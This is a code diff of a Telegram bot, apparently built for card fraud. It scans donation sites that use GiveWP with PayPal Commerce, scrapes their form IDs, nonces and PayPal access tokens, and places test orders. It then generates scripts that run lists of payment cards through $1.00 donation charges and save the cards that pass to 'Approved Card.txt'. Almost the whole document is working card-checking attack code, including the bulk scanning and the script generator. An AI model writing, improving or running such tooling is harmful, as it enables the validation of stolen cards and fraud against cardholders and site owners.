@@ -173,25 +173,29 @@ def ali_al2(massege):
             )
             return
 
-        result = check_link(link)
-        if not result:
-            bot.edit_message_text(
-                chat_id=massege.chat.id,
-                message_id=ko.message_id,
-                text="Site is not a valid PayPal gateway ❌"
-            )
-            return
-
         bot.edit_message_text(
             chat_id=massege.chat.id,
             message_id=ko.message_id,
-            text="Gate found ✅"
+            text=f"🔍 <b>Checking:</b> <code>{link}</code>",
+            parse_mode="HTML"
         )
+
+        result = check_link(link)
+        
+        if 'error' in result and 'id_form2' not in result:
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko.message_id,
+                text=f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Reason:</b> {result.get('error', 'Unknown')}",
+                parse_mode="HTML"
+            )
+            return
 
         id_form1 = result['id_form1']
         id_form2 = result['id_form2']
         nonec = result['nonec']
         au = result['au']
+        respons = result.get('respons', 'No response')
 
     except Exception as e:
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
@@ -213,7 +217,7 @@ def ali_al2(massege):
         }
 
         data = MultipartEncoder({
-            'give-form-id-prefix': (None, id_form1),
+            'give-form-id-prefix': (None, id_form1 or id_form2),
             'give-form-id': (None, id_form2),
             'give-form-hash': (None, nonec),
             'give-amount': (None, '1.00'),
@@ -238,14 +242,8 @@ def ali_al2(massege):
         try:
             tok = response.json()['data']['id']
         except:
-            bot.edit_message_text(
-                chat_id=massege.chat.id,
-                message_id=ko.message_id,
-                text='Token not In Data ❌',
-                parse_mode="HTML"
-            )
-            return
-
+            tok = ''
+        
         headers = {
             'authorization': f'Bearer {au}',
             'content-type': 'application/json',
@@ -280,7 +278,7 @@ def ali_al2(massege):
         )
 
         data = MultipartEncoder({
-            'give-form-id-prefix': (None, id_form1),
+            'give-form-id-prefix': (None, id_form1 or id_form2),
             'give-form-id': (None, id_form2),
             'give-form-hash': (None, nonec),
             'give-amount': (None, '1.00'),
@@ -306,7 +304,7 @@ def ali_al2(massege):
         )
         
         if 'ORDER_NOT_APPROVED' in response.text:
-            msg = 'Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.'
+            msg = 'Payer cannot pay for this transaction.'
         else:
             try:
                 msg = response.json()['data']['error']
@@ -328,7 +326,7 @@ class PayPal:
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
         self.donation = "1.00"
-        self.id_form1 = "{id_form1}"
+        self.id_form1 = "{id_form1 or id_form2}"
         self.id_form2 = "{id_form2}"
         self.nonec = "{nonec}"
         self.au = "{au}"
@@ -400,7 +398,7 @@ class PayPal:
         text = r5.text
         if 'true' in text: return 'CHARGE 1.00$'
         elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
+        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
         else:
             try: return r5.json()['data']['error']
             except: return "UNKNOWN_ERROR"
@@ -443,24 +441,25 @@ if __name__ == '__main__':
                 time.sleep(1)
             print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''
 
-        file_name = f'@nnunrr_{massege.from_user.id}.py'
+        file_name = f'gateway_{int(time.time())}.py'
         with open(file_name, "w", encoding="utf-8") as f:
             f.write(text_content)
         with open(file_name, "rb") as f:
             bot.send_document(
                 chat_id=massege.chat.id,
                 document=f,
-                caption=f'''The gate was successfully withdrawn ✅
+                caption=f'''✅ <b>Live Gateway Found!</b>
 ━━━━━━━━━━━━━━━━━━━━
-<strong>Gateway information ...</strong>
-
-Link: <code>{link}</code>
-id form: <code>{id_form1}</code>
-id form2: <code>{id_form2}</code>
-nonce: <code>{nonec}</code>
-client token: <code>{au}</code>
-id payment: <code>{tok}</code>
-msg gateway: <code>{msg}</code>
+🔗 Link: <code>{link}</code>
+━━━━━━━━━━━━━━━━━━━━
+📦 <b>Gateway Data:</b>
+<code>id_form1: {id_form1 or id_form2}
+id_form2: {id_form2}
+nonec: {nonec}
+au: {au}
+order_id: {tok}</code>
+━━━━━━━━━━━━━━━━━━━━
+💬 <b>Gateway Response:</b> <code>{msg}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr''',
                 parse_mode="HTML"
@@ -536,13 +535,20 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص رابط PayPal - فحص شامل لكل الأنواع"""
+    """فحص PayPal Commerce - فحص فعلي مع رد"""
     try:
         if not link.startswith(("http://", "https://")):
-            return None
+            return {'link': link, 'error': 'Invalid URL'}
 
         session = requests.Session()
-        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+        })
         
         try:
             r = session.get(link, timeout=30, allow_redirects=True, verify=False)
@@ -551,25 +557,23 @@ def check_link(link):
             try:
                 r = session.get(link, timeout=30, allow_redirects=True, verify=False)
             except:
-                return None
+                return {'link': link, 'error': 'Connection failed'}
         
         if r.status_code != 200:
-            return None
+            return {'link': link, 'error': f'Status: {r.status_code}'}
 
         res = r.text
         
-        # ============ فحص سريع: هل الصفحة فيها PayPal؟ ============
         paypal_indicators = [
             'paypal', 'PayPal', 'PAYPAL',
-            'client-token', 'client_token', 'clientToken',
-            'data-client-token',
+            'paypal.com', 'paypalobjects.com',
             'paypal_sdk', 'paypal-sdk',
             'paypal.Buttons',
             'smart-payment-buttons',
-            'ppcp', 'PPCP',
-            'give-form-id',
-            'paypal-commerce',
-            'paypal_commerce',
+            'client-token', 'client_token', 'clientToken',
+            'data-client-token',
+            'accessToken', 'access_token',
+            'give-form-id', 'give-form-hash',
         ]
         
         has_paypal = False
@@ -579,119 +583,106 @@ def check_link(link):
                 break
         
         if not has_paypal:
-            return None
+            return {'link': link, 'error': 'No PayPal detected'}
         
-        # ============ البحث عن client token ============
-        au = None
         enc = None
+        au = None
         
-        patterns = [
-            r'"data-client-token":"(.*?)"',
-            r"data-client-token='(.*?)'",
+        client_token_patterns = [
+            r'data-client-token=["\']([^"\']+)["\']',
             r'data-client-token=([^"\'\s>]+)',
-            r'clientToken["\']?\s*:\s*["\'](.*?)["\']',
-            r'name="client-token"\s+content="(.*?)"',
-            r'data-client-token\s*=\s*["\'](.*?)["\']',
-            r'"clientToken":"(.*?)"',
-            r"clientToken='(.*?)'",
-            r'clientToken=([^"\'\s>]+)',
-            r'"client_token":"(.*?)"',
-            r"client_token='(.*?)'",
-            r'client_token=([^"\'\s>]+)',
-            r'client_token\s*=\s*["\'](.*?)["\']',
-            r'clientToken\s*=\s*["\'](.*?)["\']',
-            r'"clientToken"\s*:\s*"(.*?)"',
-            r'data_client_token\s*=\s*["\'](.*?)["\']',
-            r'data-client-token\s*:\s*["\'](.*?)["\']',
-            r'client-token\s*=\s*["\'](.*?)["\']',
-            r'"client-token"\s*:\s*"(.*?)"',
-            r'client_token\s*:\s*["\'](.*?)["\']',
+            r'"data-client-token"\s*:\s*"([^"]+)"',
+            r'client-token=["\']([^"\']+)["\']',
+            r'client_token=["\']([^"\']+)["\']',
+            r'clientToken=["\']([^"\']+)["\']',
         ]
         
-        for pattern in patterns:
+        for pattern in client_token_patterns:
             match = re.search(pattern, res, re.IGNORECASE)
             if match:
                 enc = match.group(1)
                 break
         
-        # بحث مباشر عن accessToken
-        if not au:
-            direct_au_patterns = [
-                r'"accessToken":"(.*?)"',
-                r"accessToken='(.*?)'",
-                r'accessToken=([^"\'\s>]+)',
-                r'access_token["\']?\s*:\s*["\'](.*?)["\']',
-                r'"access_token":"(.*?)"',
-                r'access_token\s*=\s*["\'](.*?)["\']',
-            ]
-            for pattern in direct_au_patterns:
-                match = re.search(pattern, res, re.IGNORECASE)
-                if match:
-                    au = match.group(1)
-                    break
+        access_token_patterns = [
+            r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
+            r'"accessToken"\s*:\s*"([^"]+)"',
+            r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
+            r'accessToken=([^&\s"\']+)',
+            r'access_token=([^&\s"\']+)',
+        ]
         
-        # فك client token
-        if not au and enc:
+        for pattern in access_token_patterns:
+            match = re.search(pattern, res, re.IGNORECASE)
+            if match:
+                au = match.group(1)
+                break
+        
+        if enc and not au:
             try:
                 padded = enc + '=' * (-len(enc) % 4)
                 dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                au_match = re.search(r'"accessToken":"(.*?)"', dec)
-                if au_match:
-                    au = au_match.group(1)
-                else:
-                    au_match2 = re.search(r'accessToken["\']?\s*:\s*["\'](.*?)["\']', dec)
-                    if au_match2:
-                        au = au_match2.group(1)
+                match = re.search(r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']', dec)
+                if match:
+                    au = match.group(1)
             except:
-                au_match = re.search(r'"accessToken":"(.*?)"', enc)
-                if au_match:
-                    au = au_match.group(1)
+                pass
+            
+            if not au:
+                try:
+                    padded = enc.replace('-', '+').replace('_', '/')
+                    padded = padded + '=' * (-len(padded) % 4)
+                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
+                    match = re.search(r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']', dec)
+                    if match:
+                        au = match.group(1)
+                except:
+                    pass
         
-        if not au:
-            return None
-        
-        # ============ البحث عن form fields ============
         id_form1 = ''
         id_form2 = ''
         nonec = ''
         
-        # كل الأنماط
-        form_patterns = {
-            'id_form1': [
-                r'name="give-form-id-prefix"\s+value="(.*?)"',
-                r'give-form-id-prefix["\']?\s*:\s*["\'](.*?)["\']',
-                r'give_form_id_prefix\s*=\s*["\'](.*?)["\']',
-            ],
-            'id_form2': [
-                r'name="give-form-id"\s+value="(.*?)"',
-                r'give-form-id["\']?\s*:\s*["\'](.*?)["\']',
-                r'give_form_id\s*=\s*["\'](.*?)["\']',
-            ],
-            'nonec': [
-                r'name="give-form-hash"\s+value="(.*?)"',
-                r'give-form-hash["\']?\s*:\s*["\'](.*?)["\']',
-                r'give_form_hash\s*=\s*["\'](.*?)["\']',
-            ]
-        }
+        patterns_1 = [
+            r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']+)["\']',
+            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-id-prefix["\']',
+            r'<input[^>]*give-form-id-prefix[^>]*value=["\']([^"\']*)["\']',
+        ]
         
-        for field, patterns_list in form_patterns.items():
-            for pattern in patterns_list:
-                match = re.search(pattern, res, re.IGNORECASE)
-                if match:
-                    if field == 'id_form1':
-                        id_form1 = match.group(1)
-                    elif field == 'id_form2':
-                        id_form2 = match.group(1)
-                    else:
-                        nonec = match.group(1)
-                    break
+        for pattern in patterns_1:
+            match = re.search(pattern, res, re.IGNORECASE)
+            if match:
+                id_form1 = match.group(1)
+                break
         
-        # البحث في hidden fields
+        patterns_2 = [
+            r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']+)["\']',
+            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-id["\']',
+            r'<input[^>]*give-form-id[^>]*value=["\']([^"\']*)["\']',
+        ]
+        
+        for pattern in patterns_2:
+            match = re.search(pattern, res, re.IGNORECASE)
+            if match:
+                id_form2 = match.group(1)
+                break
+        
+        patterns_3 = [
+            r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']',
+            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-hash["\']',
+            r'<input[^>]*give-form-hash[^>]*value=["\']([^"\']*)["\']',
+        ]
+        
+        for pattern in patterns_3:
+            match = re.search(pattern, res, re.IGNORECASE)
+            if match:
+                nonec = match.group(1)
+                break
+        
         if not id_form1 or not id_form2 or not nonec:
             hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', res, re.IGNORECASE)
             for field in hidden_fields:
-                name_match = re.search(r'name=["\'](.*?)["\']', field, re.IGNORECASE)
-                value_match = re.search(r'value=["\'](.*?)["\']', field, re.IGNORECASE)
+                name_match = re.search(r'name=["\']([^"\']*)["\']', field, re.IGNORECASE)
+                value_match = re.search(r'value=["\']([^"\']*)["\']', field, re.IGNORECASE)
                 if name_match and value_match:
                     name = name_match.group(1).lower()
                     value = value_match.group(1)
@@ -702,16 +693,91 @@ def check_link(link):
                     elif 'give-form-hash' in name and not nonec:
                         nonec = value
         
-        # لو مفيش form fields، نرجع au بس (PayPal Commerce عادي)
-        return {
-            'link': link,
-            'id_form1': id_form1,
-            'id_form2': id_form2,
-            'nonec': nonec,
-            'au': au
-        }
-    except:
-        return None
+        # ============ الفحص الفعلي ============
+        response_text = ''
+        
+        if id_form2 and nonec and au:
+            try:
+                parsed = urlparse(link)
+                USER_URL2 = f'https://{parsed.netloc}'
+                USER_URL = parsed.path
+                
+                headers = {
+                    'origin': f'{USER_URL2}',
+                    'referer': f'{USER_URL}',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+                
+                data = MultipartEncoder({
+                    'give-form-id-prefix': (None, id_form1 or id_form2),
+                    'give-form-id': (None, id_form2),
+                    'give-form-hash': (None, nonec),
+                    'give-amount': (None, '1.00'),
+                    'payment-mode': (None, 'paypal-commerce'),
+                    'give_first': (None, 'Test'),
+                    'give_last': (None, 'User'),
+                    'give_email': (None, 'test@gmail.com'),
+                    'give-gateway': (None, 'paypal-commerce'),
+                })
+                headers['content-type'] = data.content_type
+                params = {'action': 'give_paypal_commerce_create_order'}
+                
+                response = session.post(
+                    f'{USER_URL2}/wp-admin/admin-ajax.php',
+                    params=params,
+                    headers=headers,
+                    data=data,
+                    timeout=30,
+                    verify=False
+                )
+                
+                try:
+                    order_id = response.json()['data']['id']
+                    response_text = f'Order ID: {order_id}'
+                except:
+                    try:
+                        error = response.json()['data']['error']
+                        response_text = f'Error: {error[:100]}'
+                    except:
+                        response_text = response.text[:100]
+            except Exception as e:
+                response_text = f'Failed: {str(e)[:100]}'
+        
+        # ============ الرجوع بالبيانات ============
+        if au and id_form2 and nonec:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': au,
+                'respons': response_text or 'No response'
+            }
+        
+        if au:
+            return {
+                'link': link,
+                'id_form1': '',
+                'id_form2': '',
+                'nonec': '',
+                'au': au,
+                'respons': response_text or 'au only'
+            }
+        
+        if id_form2 and nonec:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': au or '',
+                'respons': response_text or 'No au'
+            }
+        
+        return {'link': link, 'error': 'No valid data'}
+    except Exception as e:
+        return {'link': link, 'error': str(e)[:100]}
 
 def process_bulk_file(message):
     user_id = message.from_user.id
@@ -748,7 +814,9 @@ def process_bulk_file(message):
             'processed': 0,
             'live': 0,
             'dead': 0,
-            'lock': threading.Lock()
+            'lock': threading.Lock(),
+            'current_url': '',
+            'current_respons': ''
         }
         status_key = f"{user_id}_{file_num}"
         processing_status[status_key] = progress
@@ -760,8 +828,11 @@ def process_bulk_file(message):
 📌 Total Links: {total}
 ✅ Live: 0
 ❌ Dead: 0
-⏳ Progress: 0%
+⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
+Url : ...
+Respons : ...
 ━━━━━━━━━━━━━━━━━━
+⏱️ Checked 0 of {total}
 🛑 /stop {file_num} to stop this file""",
             parse_mode="HTML"
         )
@@ -769,28 +840,34 @@ def process_bulk_file(message):
         def update_status_loop():
             last_text = ""
             while not stop_event.is_set():
-                time.sleep(2)
+                time.sleep(1)
                 with progress['lock']:
                     processed = progress['processed']
                     live = progress['live']
                     dead = progress['dead']
+                    current_url = progress['current_url']
+                    current_respons = progress['current_respons']
+                    
                     if processed >= total:
                         break
-                    if processed == 0:
-                        continue
-                    percent = int((processed / total) * 100)
+                    
+                    percent = int((processed / total) * 100) if total > 0 else 0
                     bar_length = 20
                     filled = int((percent / 100) * bar_length)
                     bar = '█' * filled + '░' * (bar_length - filled)
+                    
                     text = f"""📊 <b>File #{file_num} - Scanning links...</b>
 ━━━━━━━━━━━━━━━━━━
 📌 Total Links: {total}
 ✅ Live: {live}
 ❌ Dead: {dead}
 ⏳ Progress: {percent}% {bar}
+Url : <code>{current_url[:60] if current_url else '...'}</code>
+Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
 ━━━━━━━━━━━━━━━━━━
 ⏱️ Checked {processed} of {total}
 🛑 /stop {file_num} to stop this file"""
+                    
                     if text != last_text:
                         try:
                             bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
@@ -801,42 +878,54 @@ def process_bulk_file(message):
         updater = threading.Thread(target=update_status_loop, daemon=True)
         updater.start()
 
-        # ============ فحص موقع موقع - بطيء ودقيق ============
         for idx, link in enumerate(links):
             if stop_event.is_set():
                 break
+            
+            with progress['lock']:
+                progress['current_url'] = link
+                progress['current_respons'] = 'Checking...'
             
             result = check_link(link)
             
             with progress['lock']:
                 progress['processed'] += 1
                 
-                if result:
+                if 'error' in result and 'id_form2' not in result:
+                    progress['dead'] += 1
+                    progress['current_respons'] = result.get('error', 'Dead')
+                else:
                     progress['live'] += 1
                     live_idx = progress['live']
+                    progress['current_respons'] = result.get('respons', 'Live')
+                    
                     try:
                         code = generate_gateway_code(result, live_idx, file_num)
-                        file_name = f'gateway_{file_num}_{live_idx}_{user_id}.py'
+                        file_name = f'gateway_{live_idx}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
-                        caption = f"""✅ <b>File #{file_num} - Gateway #{live_idx}</b>
+                        caption = f"""✅ <b>Live Gateway #{live_idx}</b>
 ━━━━━━━━━━━━━━━━━━━━
 🔗 Link: <code>{result['link']}</code>
+━━━━━━━━━━━━━━━━━━━━
+📦 <b>Gateway Data:</b>
+<code>id_form1: {result['id_form1']}
+id_form2: {result['id_form2']}
+nonec: {result['nonec']}
+au: {result['au']}</code>
+━━━━━━━━━━━━━━━━━━━━
+💬 <b>Respons:</b> <code>{result.get('respons', 'N/A')}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr"""
                         send_queue.put((chat_id, file_name, caption))
                     except Exception as e:
                         print(f"Error preparing file: {e}")
-                else:
-                    progress['dead'] += 1
             
-            # تنظيف كل 50 رابط
             if progress['processed'] % 50 == 0:
                 cleanup_memory()
-                time.sleep(0.5)
+                time.sleep(0.3)
             
-            # راحة صغيرة بين كل رابط
-            time.sleep(0.2)
+            time.sleep(0.1)
 
         stop_event.set()
         updater.join(timeout=1)
@@ -903,18 +992,20 @@ from urllib.parse import urlparse
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class PayPal{file_num}_{idx}:
+class PayPal:
     def __init__(self):
         self.first_name = ["James", "John", "Robert", "Michael", "William"]
         self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
         self.donation = "1.00"
-        self.id_form1 = "{data['id_form1']}"
+        self.id_form1 = "{data['id_form1'] or data['id_form2']}"
         self.id_form2 = "{data['id_form2']}"
         self.nonec = "{data['nonec']}"
         self.au = "{data['au']}"
-        self.url = "{data['link'].split('//')[1].split('/')[0]}"
-        self.inurl = "/" + "/".join(data['link'].split('//')[1].split('/')[1:]) if len(data['link'].split('//')[1].split('/')) > 1 else ""
+        url = '{data['link']}'
+        parsed = urlparse(url)
+        self.url = parsed.netloc
+        self.inurl = parsed.path
         self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
         self.r = requests.Session()
         self.uu = UserAgent()
@@ -979,7 +1070,7 @@ class PayPal{file_num}_{idx}:
         text = r5.text
         if 'true' in text: return 'CHARGE 1.00$'
         elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
-        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction."
+        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
         else:
             try: return r5.json()['data']['error']
             except: return "UNKNOWN_ERROR"
@@ -991,7 +1082,7 @@ if __name__ == '__main__':
     if Br == '1':
         while True:
             ar = input('Enter Card ( n | mm | yy | cvc ): ')
-            rr = PayPal{file_num}_{idx}()
+            rr = PayPal()
             resulti = rr.Charge(ar)
             if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                 with open('Approved Card.txt', "a") as f:
@@ -1008,7 +1099,7 @@ if __name__ == '__main__':
             for P in crads:
                 noy += 1
                 try:
-                    rr = PayPal{file_num}_{idx}()
+                    rr = PayPal()
                     resulti = rr.Charge(P)
                     if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                         live += 1
